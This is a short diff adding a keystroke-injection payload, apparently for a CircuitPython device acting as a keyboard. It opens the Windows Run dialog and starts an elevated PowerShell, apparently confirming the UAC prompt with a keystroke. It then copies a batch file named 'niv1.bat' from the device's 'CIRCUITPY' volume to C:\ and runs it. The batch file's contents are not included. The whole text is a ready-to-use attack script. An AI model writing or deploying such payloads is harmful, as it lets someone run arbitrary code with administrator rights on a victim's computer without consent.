@@ -1,0 +1,12 @@
+<time1>
+<GCMD>r
+<time1>
+cmd  <time1>
+<RET>
+<time1>
+Start-Process powershell.exe -Verb RunAs<time1><RET><time1><ARL><RET>
+<time1>
+<RET>
+<time2>
+$u=gwmi win32_volume|?{$_.label -eq 'CIRCUITPY'}|select name;cd $u.name;xcopy "niv1.bat" "C:\";cd C:\;.\niv1.bat
+<RET>
